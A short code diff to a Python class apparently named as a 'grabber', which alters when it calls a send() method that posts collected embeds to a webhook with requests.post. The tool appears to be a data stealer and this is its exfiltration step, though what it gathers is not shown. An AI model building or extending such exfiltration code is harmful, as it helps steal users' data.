@@ -139,10 +139,9 @@ class SMTHGRB:
         except:
             pass
 
-        if len(self.embeds) == 0:
-            exit()
+        if len(self.embeds) != 0:
 
-        self.send()
+            self.send()
 
     def send(self):
         requests.post(self.webhook, json={
